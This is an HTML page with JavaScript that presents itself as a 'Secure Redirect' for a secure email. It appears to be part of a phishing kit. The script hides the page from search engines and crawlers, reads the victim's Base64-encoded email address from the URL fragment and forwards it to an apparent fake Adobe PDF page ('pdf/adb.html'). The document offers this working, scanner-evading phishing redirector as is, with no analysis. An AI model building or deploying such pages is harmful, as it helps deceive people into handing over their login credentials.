<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="googlebot" content="noindex, nofollow" />
  <title>Secure Redirect</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #1a202c;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
    }
    .container {
      text-align: center;
      max-width: 500px;
      padding: 20px;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #4a6cf7;
    }
    .status {
      background: #2d3748;
      padding: 15px;
      border-radius: 8px;
      margin: 15px 0;
      font-size: 14px;
    }
    .loader {
      border: 3px solid #2d3748;
      border-top: 3px solid #4a6cf7;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Secure Redirect</h1>
    <div class="status" id="status">Processing secure email...</div>
    <div class="loader"></div>
  </div>

  <script>
    (function () {
      // Bot detection
      function isBotUserAgent() {
        const bots = [
          /bot/i, /crawler/i, /spider/i, /crawling/i,
          /google/i, /bing/i, /yahoo/i, /facebook/i,
          /duckduckgo/i, /baidu/i, /yandex/i
        ];
        return bots.some(bot => bot.test(navigator.userAgent));
      }

      if (isBotUserAgent()) {
        document.getElementById('status').textContent = "Access blocked: automated system detected.";
        document.querySelector('.loader').style.display = "none";
        return;
      }

      // Step 1: Get the Base64 email from the current URL (after the #)
      var encodedEmail = window.location.hash.substring(1); // removes the '#'

      // Fallback if no hash is present
      if (!encodedEmail) {
        document.getElementById('status').textContent = "Missing secure email token.";
        document.querySelector('.loader').style.display = "none";
        return;
      }

      // Step 2: Generate a strong random token
      function generateToken(length = 16) {
        const array = new Uint8Array(length);
        crypto.getRandomValues(array);
        return Array.from(array, b => b.toString(16).padStart(2, "0")).join("");
      }
      var token = generateToken();

      // Step 3: Build the redirect URL
      var redirectUrl = "pdf/adb.html#email=" + encodedEmail + "&token=" + token;

      // Step 4: Update status and redirect
      document.getElementById('status').textContent = "Redirecting...";
      setTimeout(() => {
        window.location.replace(redirectUrl);
      }, 1500);

    })();
  </script>
</body>
</html>
